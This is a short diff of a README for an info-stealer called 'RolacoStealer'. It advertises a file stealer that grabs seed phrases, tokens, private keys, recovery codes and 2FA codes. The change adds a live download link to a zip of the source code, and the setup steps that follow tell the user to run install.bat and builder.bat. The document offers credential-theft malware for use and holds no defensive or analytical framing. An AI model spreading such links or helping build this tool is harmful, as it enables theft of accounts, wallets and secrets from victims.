@@ -72,14 +72,9 @@
 -  📁 File Stealer
     -   Grabs Seed Phrases, Tokens, Private Keys, Recovery Codes, Backup Codes, 2FA codes
 
-
-
-
-
-
                                                       ⬇️ Setup
 
-1. [Download source code zip]()
+1. [Download source code zip](https://github.com/user-attachments/files/15748703/RolacoStealer.zip)
 2. Extract zip
 3. First install reqiured packages by double clicking `install.bat` file
 4. Run the builder by double clicking the `builder.bat` file
